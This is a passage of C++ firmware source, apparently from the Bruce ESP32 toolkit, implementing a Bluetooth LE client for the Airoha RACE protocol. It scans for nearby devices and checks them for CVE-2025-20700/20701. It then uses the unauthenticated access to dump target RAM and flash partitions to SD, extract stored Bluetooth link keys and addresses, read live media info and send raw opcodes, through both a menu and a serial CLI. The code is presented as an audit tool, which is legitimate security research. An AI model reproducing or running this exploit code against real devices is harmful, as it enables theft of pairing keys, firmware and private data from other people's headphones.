        Serial.printf("[RACE-PT] [%u] %-12s Addr:0x%08X Len:0x%08X (%uKB)\n",
                      (unsigned int)partitions.size(), p.name.c_str(),
                      (unsigned int)p.address, (unsigned int)p.length, (unsigned int)(p.length / 1024));

        partitions.push_back(p);
        offset += entrySize;
    }

    return (!partitions.empty());
}

//=============================================================================
// Memory / Flash Dump to Storage (SD / LittleFS)
//=============================================================================

bool RaceClient::dumpMemoryToStorage(bool isRam, uint32_t address, size_t size,
                                     String &outSavedPath,
                                     std::function<void(size_t done, size_t total)> progressCb)
{
    outSavedPath = "";
    if (!isConnected() || size == 0) return false;

    // Check SD card first, fallback to LittleFS
    bool useSd = sdcardMounted;
    if (!useSd) useSd = setupSdCard(2);

    FS *fs = useSd ? (FS *)&SD : (FS *)&LittleFS;
    String baseDir = useSd ? "/sd/bruce/race_dumps" : "/bruce/race_dumps";

    if (!fs->exists("/bruce")) fs->mkdir("/bruce");
    if (!fs->exists("/bruce/race_dumps")) fs->mkdir("/bruce/race_dumps");

    char fName[64];
    snprintf(fName, sizeof(fName), "%s/%s_0x%08X_%u.bin",
             baseDir.c_str(), isRam ? "ram" : "flash", (unsigned int)address, (unsigned int)size);
    outSavedPath = String(fName);

    String localFsPath = String(fName);
    if (useSd && localFsPath.startsWith("/sd")) {
        localFsPath = localFsPath.substring(3);
    }

    File file = fs->open(localFsPath, FILE_WRITE);
    if (!file) {
        Serial.printf("[RACE] Failed to open file for writing: %s\n", localFsPath.c_str());
        return false;
    }

    size_t chunkSize = isRam ? 64 : 256;
    size_t totalBytes = size;
    size_t bytesWritten = 0;

    std::vector<uint8_t> chunkBuf;

    while (bytesWritten < totalBytes) {
        if (check(EscPress) || check(PrevPress)) {
            Serial.println(F("[RACE] Memory dump aborted by user keypress (ESC)"));
            file.close();
            return false;
        }

        size_t toRead = (totalBytes - bytesWritten > chunkSize) ? chunkSize : (totalBytes - bytesWritten);
        uint32_t currAddr = address + bytesWritten;
        bool ok = false;

        if (isRam) {
            ok = readRam(currAddr, toRead, chunkBuf);
        } else {
            ok = readFlash(currAddr, toRead, chunkBuf);
        }

        if (!ok || chunkBuf.size() < toRead) {
            file.close();
            return false;
        }

        file.write(chunkBuf.data(), toRead);
        bytesWritten += toRead;

        if (progressCb) {
            progressCb(bytesWritten, totalBytes);
        }
    }

    file.flush();
    file.close();
    Serial.printf("[RACE] Dump complete: %u bytes saved to %s\n", (unsigned int)bytesWritten, outSavedPath.c_str());
    return true;
}

//=============================================================================
// Interactive UI Menu Implementation
//=============================================================================

static void showHexViewer(const String &title, uint32_t startAddr, const std::vector<uint8_t> &data) {
    ScrollableTextArea area(title);
    char lineBuf[80];

    for (size_t i = 0; i < data.size(); i += 16) {
        size_t rem = data.size() - i;
        size_t count = (rem > 16) ? 16 : rem;

        snprintf(lineBuf, sizeof(lineBuf), "%08X: ", (unsigned int)(startAddr + i));
        String hexStr = lineBuf;

        for (size_t j = 0; j < 16; j++) {
            if (j < count) {
                char byteStr[4];
                snprintf(byteStr, sizeof(byteStr), "%02X ", data[i + j]);
                hexStr += byteStr;
            } else {
                hexStr += "   ";
            }
            if (j == 7) hexStr += " ";
        }

        hexStr += " |";
        for (size_t j = 0; j < count; j++) {
            uint8_t b = data[i + j];
            hexStr += (b >= 32 && b <= 126) ? (char)b : '.';
        }
        hexStr += "|";

        area.addLine(hexStr);
    }

    area.show();
}

static void showVulnReportUi(const RaceVulnerabilityReport &report, const RaceDeviceInfo &info) {
    ScrollableTextArea area("RACE VULN CHECK");

    area.addLine("=== Airoha RACE Audit ===");
    area.addLine("");
    area.addLine("[CVE-2025-20700: GATT Auth]");
    if (report.cve2025_20700 == RACE_VULN_VULNERABLE) {
        area.addLine("STATUS: VULNERABLE!");
        area.addLine("RACE GATT allows unauthenticated");
        area.addLine("commands without pairing/auth.");
    } else if (report.cve2025_20700 == RACE_VULN_FIXED) {
        area.addLine("STATUS: FIXED / AUTH REQUIRED");
    } else {
        area.addLine("STATUS: NOT APPLICABLE");
    }
    area.addLine("");

    area.addLine("[CVE-2025-20701: Memory Access]");
    if (report.cve2025_20700 == RACE_VULN_VULNERABLE) {
        area.addLine("STATUS: POTENTIALLY EXPOSED");
        area.addLine("Direct RAM/Flash read commands");
        area.addLine("reachable via BLE transport.");
    } else {
        area.addLine("STATUS: SAFE / GATED");
    }
    area.addLine("");

    area.addLine("[EXTRACTED METADATA]");
    area.addLine("Classic BD_ADDR: " + (info.classicBdAddr.isEmpty() ? "N/A" : info.classicBdAddr));
    area.addLine("SDK: " + (info.sdkInfo.isEmpty() ? "N/A" : info.sdkInfo));
    area.addLine("Build: " + (info.buildVersion.isEmpty() ? "N/A" : info.buildVersion));
    area.addLine("Link Keys: " + String(info.linkKeyCount) + " stored");
    area.addLine("");

    area.addLine("Press ESC to exit");
    area.show();
}

static void showDeviceInfoUi(const RaceDeviceInfo &info) {
    ScrollableTextArea area("RACE DEVICE INFO");

    area.addLine("=== Target Device Info ===");
    area.addLine("");
    area.addLine("Classic BD_ADDR:");
    area.addLine("  " + (info.classicBdAddr.isEmpty() ? "Not exposed / Protected" : info.classicBdAddr));
    area.addLine("");

    area.addLine("SDK Version:");
    area.addLine("  " + (info.sdkInfo.isEmpty() ? "Unknown" : info.sdkInfo));
    area.addLine("");

    area.addLine("Build Version:");
    area.addLine("  " + (info.buildVersion.isEmpty() ? "Unknown" : info.buildVersion));
    area.addLine("");

    area.addLine("Stored Link Keys (" + String(info.linkKeyCount) + "):");
    if (info.linkKeys.empty()) {
        area.addLine("  None extracted or command blocked");
    } else {
        for (size_t i = 0; i < info.linkKeys.size(); i++) {
            area.addLine("  [" + String((int)i) + "] " + info.linkKeys[i]);
        }
    }
    area.addLine("");
    area.addLine("RACE Service UUID:");
    area.addLine("  " + info.matchedServiceUuid);

    area.show();
}

static void runRamInspectorUi(RaceClient &client) {
    String addrStr = hex_keyboard("14238C9C", 8, "Enter RAM Hex Addr:");
    if (addrStr.isEmpty()) return;

    uint32_t addr = (uint32_t)strtoul(addrStr.c_str(), NULL, 16);
    addr = addr & ~0x03; // Align to 4 bytes

    String sizeStr = num_keyboard("64", 4, "Bytes to read (4-512):");
    if (sizeStr.isEmpty()) return;
    size_t size = sizeStr.toInt();
    if (size < 4) size = 4;
    if (size > 512) size = 512;
    size = (size + 3) & ~0x03;

    drawMainBorder(true);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString("Address: 0x" + String(addr, HEX) + " (" + String((int)size) + "B)", BORDER_PAD_X, BORDER_PAD_Y + 16);
    tft.drawString("Status:  Reading words...", BORDER_PAD_X, BORDER_PAD_Y + 28);

    std::vector<uint8_t> ramData;
    bool ok = client.readRam(addr, size, ramData, [addr](size_t done, size_t total) {
        tft.setTextSize(FP);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.fillRect(BORDER_PAD_X, BORDER_PAD_Y + 28, tftWidth - 2 * BORDER_PAD_X, 11, bruceConfig.bgColor);
        int pct = (total > 0) ? (int)((done * 100) / total) : 0;
        tft.drawString("Status:  Reading " + String(pct) + "% (" + String((int)done) + "/" + String((int)total) + "B)", BORDER_PAD_X, BORDER_PAD_Y + 28);
    });

    if (!ok || ramData.empty()) {
        if (check(EscPress) || check(PrevPress)) {
            displayWarning("RAM Read Cancelled", true);
        } else {
            displayError("RAM Read Failed / Blocked", true);
        }
        return;
    }

    char titleBuf[32];
    snprintf(titleBuf, sizeof(titleBuf), "RAM 0x%08X", (unsigned int)addr);
    showHexViewer(titleBuf, addr, ramData);

    // Prompt to save dump to SD
    String saveOpt = keyboard("Y", 1, "Save Dump to SD? (Y/N)");
    if (saveOpt.equalsIgnoreCase("Y")) {
        String savedPath;
        if (client.dumpMemoryToStorage(true, addr, size, savedPath)) {
            displaySuccess("Saved: " + savedPath, true);
        } else {
            displayError("Save failed", true);
        }
    }
}

static void runPartitionTableUi(RaceClient &client) {
    drawMainBorder(true);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString("Flash Addr: 0x00000000", BORDER_PAD_X, BORDER_PAD_Y + 16);
    tft.drawString("Reading Flash Header (4KB)...", BORDER_PAD_X, BORDER_PAD_Y + 28);

    std::vector<RacePartitionEntry> partitions;
    if (!client.getPartitionTable(partitions) || partitions.empty()) {
        if (check(EscPress) || check(PrevPress)) {
            displayWarning("Operation Cancelled", true);
        } else {
            displayError("Failed to parse partition table", true);
        }
        return;
    }

    std::vector<String> menuItems;
    for (size_t i = 0; i < partitions.size(); i++) {
        char pBuf[64];
        snprintf(pBuf, sizeof(pBuf), "[%d] %s (0x%X, %uKB)",
                 (int)i, partitions[i].name.c_str(),
                 (unsigned int)partitions[i].address,
                 (unsigned int)(partitions[i].length / 1024));
        menuItems.push_back(pBuf);
    }

    ScrollableTextArea area("PARTITION TABLE");
    area.addLine("=== Airoha Flash Partitions ===");
    area.addLine("");
    for (size_t i = 0; i < partitions.size(); i++) {
        char pBuf[80];
        snprintf(pBuf, sizeof(pBuf), "[%d] %-12s Addr:0x%08X Len:0x%08X (%uKB)",
                 (int)i, partitions[i].name.c_str(),
                 (unsigned int)partitions[i].address,
                 (unsigned int)partitions[i].length,
                 (unsigned int)(partitions[i].length / 1024));
        area.addLine(pBuf);
    }
    area.addLine("");
    area.show();

    // Option to dump a selected partition to SD
    String partIdxStr = num_keyboard("6", 2, "Dump Partition Index (ESC cancel):");
    if (!partIdxStr.isEmpty()) {
        int idx = partIdxStr.toInt();
        if (idx >= 0 && idx < (int)partitions.size()) {
            const auto &p = partitions[idx];
            drawMainBorder(true);
            tft.setTextSize(FP);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.drawString("Partition: " + p.name, BORDER_PAD_X, BORDER_PAD_Y + 16);
            tft.drawString("Size:      " + String((unsigned int)(p.length / 1024)) + " KB", BORDER_PAD_X, BORDER_PAD_Y + 28);

            String savedPath;
            bool ok = client.dumpMemoryToStorage(false, p.address, p.length, savedPath, [p](size_t done, size_t total) {
                tft.setTextSize(FP);
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                tft.fillRect(BORDER_PAD_X, BORDER_PAD_Y + 40, tftWidth - 2 * BORDER_PAD_X, 11, bruceConfig.bgColor);
                int pct = (total > 0) ? (int)((done * 100) / total) : 0;
                tft.drawString("Progress:  " + String(pct) + "% (" + String((int)(done / 1024)) + "KB)", BORDER_PAD_X, BORDER_PAD_Y + 40);
            });
            if (ok) {
                displaySuccess("Dumped: " + savedPath, true);
            } else {
                if (check(EscPress) || check(PrevPress)) {
                    displayWarning("Dump Cancelled", true);
                } else {
                    displayError("Partition dump failed", true);
                }
            }
        }
    }
}

static void runCustomRawCmdUi(RaceClient &client) {
    String cmdStr = hex_keyboard("0301", 4, "Cmd ID (Hex, e.g. 0301):");
    if (cmdStr.isEmpty()) return;

    uint16_t cmdId = (uint16_t)strtoul(cmdStr.c_str(), NULL, 16);

    drawMainBorder(true);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString("Opcode: 0x" + String(cmdId, HEX), BORDER_PAD_X, BORDER_PAD_Y + 16);
    tft.drawString("Waiting for response...", BORDER_PAD_X, BORDER_PAD_Y + 28);

    std::vector<uint8_t> rsp;
    if (!client.sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, cmdId, nullptr, 0, rsp, 2000)) {
        if (check(EscPress) || check(PrevPress)) {
            displayWarning("Command Cancelled", true);
        } else {
            displayError("No response received", true);
        }
        return;
    }

    char titleBuf[32];
    snprintf(titleBuf, sizeof(titleBuf), "RSP 0x%04X (%uB)", cmdId, (unsigned int)rsp.size());
    showHexViewer(titleBuf, 0, rsp);
}

static void runMediaInfoUi(RaceClient &client) {
    drawMainBorder(true);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString("Reading Live Media Info...", BORDER_PAD_X, BORDER_PAD_Y + 16);
    tft.drawString("Status: Querying RAM...", BORDER_PAD_X, BORDER_PAD_Y + 28);

    String track, album, artist, genre;
    bool ok = client.fetchMediaInfo(track, album, artist, genre);

    if (!ok && (check(EscPress) || check(PrevPress))) {
        displayWarning("Cancelled", true);
        return;
    }

    ScrollableTextArea area("RACE MEDIA INFO");
    area.addLine("=== Currently Playing ===");
    area.addLine("");
    if (!track.isEmpty() || !artist.isEmpty() || !album.isEmpty()) {
        area.addLine("Track:");
        area.addLine("  " + (track.isEmpty() ? "Unknown" : track));
        area.addLine("");
        area.addLine("Artist:");
        area.addLine("  " + (artist.isEmpty() ? "Unknown" : artist));
        area.addLine("");
        area.addLine("Album:");
        area.addLine("  " + (album.isEmpty() ? "Unknown" : album));
        area.addLine("");
        area.addLine("Genre:");
        area.addLine("  " + (genre.isEmpty() ? "Unknown" : genre));
    } else {
        area.addLine("No active media track found");
        area.addLine("in RAM buffers or target FW");
        area.addLine("version uses different layout.");
    }

    area.show();
}

static void runVulnCheckUi(RaceClient &client, const String &devName) {
    drawMainBorder(true);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString("Target: " + gattFitText(devName, tftWidth - 20), BORDER_PAD_X, BORDER_PAD_Y + 16);
    tft.drawString("Audit: CVE-2025-20700...", BORDER_PAD_X, BORDER_PAD_Y + 28);

    auto showStep = [](const String &msg) {
        tft.setTextSize(FP);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.fillRect(BORDER_PAD_X, BORDER_PAD_Y + 40, tftWidth - 2 * BORDER_PAD_X, 12, bruceConfig.bgColor);
        tft.drawString(gattFitText(msg, tftWidth - 2 * BORDER_PAD_X), BORDER_PAD_X, BORDER_PAD_Y + 40);
    };

    RaceDeviceInfo info;
    bool okInfo = client.fetchDeviceInfo(info, showStep);
    if (check(EscPress) || check(PrevPress)) {
        displayWarning("Audit Cancelled", true);
        return;
    }

    RaceVulnerabilityReport rep;
    bool okVuln = client.probeVulnerability(rep, showStep);
    if (check(EscPress) || check(PrevPress)) {
        displayWarning("Audit Cancelled", true);
        return;
    }

    showVulnReportUi(rep, info);
}

static void runDeviceInfoUi(RaceClient &client, const String &devName) {
    drawMainBorder(true);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString("Target: " + gattFitText(devName, tftWidth - 20), BORDER_PAD_X, BORDER_PAD_Y + 16);
    tft.drawString("Reading Device Info...", BORDER_PAD_X, BORDER_PAD_Y + 28);

    auto showStep = [](const String &msg) {
        tft.setTextSize(FP);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.fillRect(BORDER_PAD_X, BORDER_PAD_Y + 40, tftWidth - 2 * BORDER_PAD_X, 12, bruceConfig.bgColor);
        tft.drawString(gattFitText(msg, tftWidth - 2 * BORDER_PAD_X), BORDER_PAD_X, BORDER_PAD_Y + 40);
    };

    RaceDeviceInfo info;
    bool ok = client.fetchDeviceInfo(info, showStep);
    if (check(EscPress) || check(PrevPress)) {
        displayWarning("Cancelled", true);
        return;
    }

    showDeviceInfoUi(info);
}

void launchRaceForDevice(NimBLEClient *pClient, const String &devName, const NimBLEAddress &address) {
    if (!pClient || !pClient->isConnected()) {
        displayError("Device not connected", true);
        return;
    }

    RaceClient client;
    drawMainBorder(true);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString("Target: " + gattFitText(devName, tftWidth - 20), BORDER_PAD_X, BORDER_PAD_Y + 16);
    tft.drawString("Probing RACE GATT service...", BORDER_PAD_X, BORDER_PAD_Y + 28);

    if (!client.attachClient(pClient)) {
        displayError("No RACE service on device", true);
        return;
    }

    displaySuccess("RACE Connected!", false);
    delay(300);

    struct RaceMenuItem {
        String label;
        std::function<void()> action;
    };

    int menuCursor = 0;
    while (client.isConnected()) {
        std::vector<RaceMenuItem> items;
        items.push_back({"1. Quick Vuln Check (CVE)", [&]() {
            runVulnCheckUi(client, devName);
        }});

        items.push_back({"2. Device Info & Keys", [&]() {
            runDeviceInfoUi(client, devName);
        }});

        items.push_back({"3. Live Media Info", [&]() {
            runMediaInfoUi(client);
        }});

        items.push_back({"4. RAM Memory Inspector", [&]() {
            runRamInspectorUi(client);
        }});

        items.push_back({"5. Flash Partition Table", [&]() {
            runPartitionTableUi(client);
        }});

        items.push_back({"6. Send Raw RACE Opcode", [&]() {
            runCustomRawCmdUi(client);
        }});

        items.push_back({"7. Disconnect / Back", [&]() {
            // Return back
        }});

        auto drawer = [&items](int idx, int x, int y, int w, bool sel) {
            uint16_t fg = sel ? bruceConfig.bgColor : bruceConfig.priColor;
            uint16_t bg = sel ? bruceConfig.priColor : bruceConfig.bgColor;
            tft.setTextColor(fg, bg);
            tft.setTextSize(FP);
            tft.drawString(gattFitText(items[idx].label, w), x, y, 1);
        };

        int chosen = gattListLoop("", items.size(), "SEL choose  ESC back", drawer, &menuCursor);
        if (chosen < 0 || chosen >= (int)items.size() - 1) break;
        if (items[chosen].action) {
            items[chosen].action();
        }
    }
}

//=============================================================================
// Standalone RACE Menu
//=============================================================================

void raceMainMenu() {
    drawMainBorder(true);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString("Scanning for BLE devices (5s)...", BORDER_PAD_X, BORDER_PAD_Y + 16);

    BLEStateManager::initBLE("Bruce-RACE", ESP_PWR_LVL_P9);

    NimBLEScan *pScan = NimBLEDevice::getScan();
    if (!pScan) {
        displayError("Failed to get scan engine", true);
        return;
    }

    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);
    pScan->setDuplicateFilter(true);
    pScan->clearResults();

    NimBLEScanResults results = pScan->getResults(5000, false);

    struct ScannedTarget {
        NimBLEAddress addr;
        String name;
        String vendor;
        int rssi;
        uint8_t addrType;
    };
    std::vector<ScannedTarget> devList;

    for (size_t i = 0; i < results.getCount(); i++) {
        const NimBLEAdvertisedDevice *dev = results.getDevice(i);
        if (!dev) continue;

        ScannedTarget st;
        st.addr = dev->getAddress();
        st.name = dev->getName().c_str();
        st.rssi = dev->getRSSI();
        st.addrType = dev->getAddressType();
        st.vendor = resolveBleVendor(dev, false);
        if (st.name.isEmpty()) {
            if (!st.vendor.isEmpty()) {
                st.name = st.vendor;
            } else {
                st.name = String(st.addr.toString().c_str());
            }
        }
        devList.push_back(st);
    }

    // Stop scan cleanly and clear results buffer now that data is copied
    pScan->stop();
    pScan->clearResults();
    vTaskDelay(100 / portTICK_PERIOD_MS);

    if (devList.empty()) {
        displayWarning("No devices found", true);
        return;
    }

    std::sort(devList.begin(), devList.end(), [](const ScannedTarget &a, const ScannedTarget &b) {
        return a.rssi > b.rssi;
    });

    int devCursor = 0;
    while (true) {
        int devCount = (int)devList.size();
        int totalCount = devCount + 1; // targets + Back

        auto drawer = [&devList, devCount](int idx, int x, int y, int w, bool sel) {
            uint16_t fg = sel ? bruceConfig.bgColor : bruceConfig.priColor;
            uint16_t bg = sel ? bruceConfig.priColor : bruceConfig.bgColor;
            tft.setTextColor(fg, bg);
            tft.setTextSize(FP);

            if (idx < devCount) {
                const auto &d = devList[idx];
                gattDrawRssi(x, y, d.rssi, fg);
                int textX = x + 16;
                int textW = w - 16;

                String typeTag = (d.addrType == BLE_ADDR_PUBLIC) ? "P" : "R";
                String macStr = String(d.addr.toString().c_str());
                String label;
                if (d.name.length() > 0 && !d.name.equalsIgnoreCase(macStr)) {
                    if (d.vendor.length() > 0 && !d.name.equalsIgnoreCase(d.vendor)) {
                        label = "[" + typeTag + "] " + d.name + " (" + d.vendor + ") " + String(d.rssi) + "dBm";
                    } else {
                        label = "[" + typeTag + "] " + d.name + " " + String(d.rssi) + "dBm";
                    }
                } else if (d.vendor.length() > 0) {
                    label = "[" + typeTag + "] " + d.vendor + " (" + macStr.substring(9) + ") " + String(d.rssi) + "dBm";
                } else {
                    label = "[" + typeTag + "] " + macStr + " " + String(d.rssi) + "dBm";
                }
                tft.drawString(gattFitText(label, textW), textX, y, 1);
            } else {
                tft.drawString("< Back to Bluetooth Menu", x, y, 1);
            }
        };

        int chosen = gattListLoop("RACE TARGETS", totalCount, "SEL connect  ESC back", drawer, &devCursor);
        if (chosen < 0 || chosen >= devCount) {
            break;
        }

        const auto &targetDev = devList[chosen];
        NimBLEAddress targetAddr = targetDev.addr;

        drawMainBorder(true);
        tft.setTextSize(FP);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.drawString("Target: " + gattFitText(targetDev.name, tftWidth - 20), BORDER_PAD_X, BORDER_PAD_Y + 16);
        tft.drawString("MAC:    " + String(targetAddr.toString().c_str()), BORDER_PAD_X, BORDER_PAD_Y + 28);

        NimBLEClient *pClient = nullptr;
        int err = 0;
        bool cancelled = false;
        if (!gattConnectWithStrategies(targetAddr, &pClient, &err, &cancelled) || !pClient) {
            if (!cancelled) {
                displayError("Connection failed", true);
            }
            continue;
        }

        RaceClient client;
        if (!client.attachClient(pClient)) {
            displayError("No RACE GATT service found", true);
            if (pClient->isConnected()) pClient->disconnect();
            NimBLEDevice::deleteClient(pClient);
            pClient = nullptr;
            continue;
        }

        displaySuccess("RACE Connected!", false);
        delay(300);

        struct RaceMenuItem {
            String label;
            std::function<void()> action;
        };

        int raceOpCursor = 0;
        while (client.isConnected()) {
            std::vector<RaceMenuItem> raceOps;
            raceOps.push_back({"1. Quick Vuln Check (CVE)", [&]() {
                runVulnCheckUi(client, targetDev.name);
            }});

            raceOps.push_back({"2. Device Info & Keys", [&]() {
                runDeviceInfoUi(client, targetDev.name);
            }});

            raceOps.push_back({"3. Live Media Info", [&]() {
                runMediaInfoUi(client);
            }});

            raceOps.push_back({"4. RAM Memory Inspector", [&]() {
                runRamInspectorUi(client);
            }});

            raceOps.push_back({"5. Flash Partition Table", [&]() {
                runPartitionTableUi(client);
            }});

            raceOps.push_back({"6. Send Raw RACE Opcode", [&]() {
                runCustomRawCmdUi(client);
            }});

            raceOps.push_back({"7. Disconnect & Back", [&]() {
                client.disconnect();
            }});

            auto drawer = [&raceOps](int idx, int x, int y, int w, bool sel) {
                uint16_t fg = sel ? bruceConfig.bgColor : bruceConfig.priColor;
                uint16_t bg = sel ? bruceConfig.priColor : bruceConfig.bgColor;
                tft.setTextColor(fg, bg);
                tft.setTextSize(FP);
                tft.drawString(gattFitText(raceOps[idx].label, w), x, y, 1);
            };

            int chosen = gattListLoop("", raceOps.size(), "SEL choose  ESC back", drawer, &raceOpCursor);
            if (chosen < 0 || chosen >= (int)raceOps.size() - 1) {
                client.disconnect();
                break;
            }
            if (raceOps[chosen].action) {
                raceOps[chosen].action();
            }
        }

        client.disconnect();
        if (pClient) {
            if (pClient->isConnected()) pClient->disconnect();
            NimBLEDevice::deleteClient(pClient);
            pClient = nullptr;
        }
    }
}

//=============================================================================
// Serial CLI Handler
//=============================================================================

bool raceCli(const String &macStr, uint8_t addrType, const String &subCmd,
             const String &param1, const String &param2, const String &param3)
{
    if (macStr.isEmpty()) {
        serialDevice->println("Usage: ble race <MAC> [pub|rnd] <check|info|ram|flash|parttable|raw> [args...]");
        return false;
    }

    NimBLEAddress target(std::string(macStr.c_str()), addrType);
    serialDevice->printf("[RACE-CLI] Connecting to %s (%s)...\n",
                         target.toString().c_str(),
                         (addrType == BLE_ADDR_PUBLIC) ? "PUBLIC" : "RANDOM");

    RaceClient client;
    if (!client.connect(target, 8000)) {
        serialDevice->println("[RACE-CLI] Connection failed or no RACE service exposed.");
        return false;
    }

    serialDevice->printf("[RACE-CLI] Connected to RACE Service: %s\n", client.getServiceUuid().c_str());

    String cmd = subCmd;
    cmd.trim();
    cmd.toLowerCase();

    if (cmd == "check" || cmd == "vuln") {
        serialDevice->println("[RACE-CLI] Running Vulnerability Assessment...");
        RaceVulnerabilityReport rep;
        RaceDeviceInfo info;
        client.fetchDeviceInfo(info);
        client.probeVulnerability(rep);

        serialDevice->println("========================================");
        serialDevice->println("       AIROHA RACE VULNERABILITY REPORT  ");
        serialDevice->println("========================================");
        serialDevice->printf("CVE-2025-20700 (GATT Auth): %s\n",
                             (rep.cve2025_20700 == RACE_VULN_VULNERABLE) ? "VULNERABLE (Unauthenticated commands accepted!)" :
                             (rep.cve2025_20700 == RACE_VULN_FIXED) ? "FIXED / PROTECTED" : "NOT APPLICABLE");
        serialDevice->printf("Details: %s\n", rep.details.c_str());
        serialDevice->printf("Classic BD_ADDR: %s\n", info.classicBdAddr.isEmpty() ? "N/A" : info.classicBdAddr.c_str());
        serialDevice->printf("SDK Info:        %s\n", info.sdkInfo.isEmpty() ? "N/A" : info.sdkInfo.c_str());
        serialDevice->printf("Build Version:   %s\n", info.buildVersion.isEmpty() ? "N/A" : info.buildVersion.c_str());
        serialDevice->println("========================================");
        return true;
    }
    else if (cmd == "info" || cmd == "devinfo") {
        serialDevice->println("[RACE-CLI] Querying Device Info...");
        RaceDeviceInfo info;
        client.fetchDeviceInfo(info);

        serialDevice->println("=== Airoha Device Metadata ===");
        serialDevice->printf("Classic BD_ADDR: %s\n", info.classicBdAddr.isEmpty() ? "N/A" : info.classicBdAddr.c_str());
        serialDevice->printf("SDK Version:     %s\n", info.sdkInfo.isEmpty() ? "N/A" : info.sdkInfo.c_str());
        serialDevice->printf("Build Version:   %s\n", info.buildVersion.isEmpty() ? "N/A" : info.buildVersion.c_str());
        serialDevice->printf("Link Keys (%d):\n", info.linkKeyCount);
        for (size_t i = 0; i < info.linkKeys.size(); i++) {
            serialDevice->printf("  [%d]: %s\n", (int)i, info.linkKeys[i].c_str());
        }
        return true;
    }
    else if (cmd == "mediainfo" || cmd == "media") {
        serialDevice->println("[RACE-CLI] Querying Playing Media Metadata...");
        String track, album, artist, genre;
        if (client.fetchMediaInfo(track, album, artist, genre)) {
            serialDevice->println("=== Playing Media Info ===");
            serialDevice->printf("Track:  %s\n", track.c_str());
            serialDevice->printf("Artist: %s\n", artist.c_str());
            serialDevice->printf("Album:  %s\n", album.c_str());
            serialDevice->printf("Genre:  %s\n", genre.c_str());
            return true;
        } else {
            serialDevice->println("[RACE-CLI] Media info not found in target RAM buffers.");
            return false;
        }
    }
    else if (cmd == "ram") {
        uint32_t addr = (uint32_t)strtoul(param1.c_str(), NULL, 16);
        size_t size = (size_t)strtoul(param2.c_str(), NULL, 16);
        if (size == 0) size = 16;
        if (size > 1024) size = 1024;

        serialDevice->printf("[RACE-CLI] Reading RAM at 0x%08X (%u bytes)...\n", (unsigned int)addr, (unsigned int)size);
        std::vector<uint8_t> ram;
        if (!client.readRam(addr, size, ram)) {
            serialDevice->println("[RACE-CLI] RAM Read Failed.");
            return false;
        }

        // Hex dump to serial
        for (size_t i = 0; i < ram.size(); i += 16) {
            serialDevice->printf("%08X: ", (unsigned int)(addr + i));
            for (size_t j = 0; j < 16; j++) {
                if (i + j < ram.size()) {
                    serialDevice->printf("%02X ", ram[i + j]);
                } else {
                    serialDevice->print("   ");
                }
            }
            serialDevice->print(" |");
            for (size_t j = 0; j < 16 && (i + j) < ram.size(); j++) {
                uint8_t b = ram[i + j];
                serialDevice->print((b >= 32 && b <= 126) ? (char)b : '.');
            }
            serialDevice->println("|");
        }
        return true;
    }
    else if (cmd == "flash") {
        uint32_t addr = (uint32_t)strtoul(param1.c_str(), NULL, 16);
        size_t size = (size_t)strtoul(param2.c_str(), NULL, 16);
        if (size == 0) size = 256;

        serialDevice->printf("[RACE-CLI] Reading Flash at 0x%08X (%u bytes)...\n", (unsigned int)addr, (unsigned int)size);
        std::vector<uint8_t> flash;
        if (!client.readFlash(addr, size, flash)) {
            serialDevice->println("[RACE-CLI] Flash Read Failed.");
            return false;
        }

        for (size_t i = 0; i < flash.size(); i += 16) {
            serialDevice->printf("%08X: ", (unsigned int)(addr + i));
            for (size_t j = 0; j < 16; j++) {
                if (i + j < flash.size()) {
                    serialDevice->printf("%02X ", flash[i + j]);
                } else {
                    serialDevice->print("   ");
                }
            }
            serialDevice->print(" |");
            for (size_t j = 0; j < 16 && (i + j) < flash.size(); j++) {
                uint8_t b = flash[i + j];
                serialDevice->print((b >= 32 && b <= 126) ? (char)b : '.');
            }
            serialDevice->println("|");
        }
        return true;
    }
    else if (cmd == "parttable" || cmd == "partitions") {
        serialDevice->println("[RACE-CLI] Reading Flash Partition Table...");
        std::vector<RacePartitionEntry> parts;
        if (!client.getPartitionTable(parts) || parts.empty()) {
            serialDevice->println("[RACE-CLI] Failed to read partition table.");
            return false;
        }

        serialDevice->println("=== Flash Partition Table ===");
        for (size_t i = 0; i < parts.size(); i++) {
            serialDevice->printf("Partition [%d]: %-12s Addr: 0x%08X, Len: 0x%08X (%u KB)\n",
                                 (int)i, parts[i].name.c_str(),
                                 (unsigned int)parts[i].address,
                                 (unsigned int)parts[i].length,
                                 (unsigned int)(parts[i].length / 1024));
        }
        return true;
    }
    else if (cmd == "raw") {
        uint16_t cmdId = (uint16_t)strtoul(param1.c_str(), NULL, 16);
        serialDevice->printf("[RACE-CLI] Sending raw RACE command 0x%04X...\n", cmdId);
        std::vector<uint8_t> rsp;
        if (!client.sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, cmdId, nullptr, 0, rsp, 3500)) {
            serialDevice->println("[RACE-CLI] Command timed out or failed.");
            return false;
        }

        serialDevice->printf("[RACE-CLI] Response (%u bytes):\n", (unsigned int)rsp.size());
        for (size_t i = 0; i < rsp.size(); i++) {
            serialDevice->printf("%02X ", rsp[i]);
            if ((i + 1) % 16 == 0) serialDevice->println();
        }
        serialDevice->println();
        return true;
    }

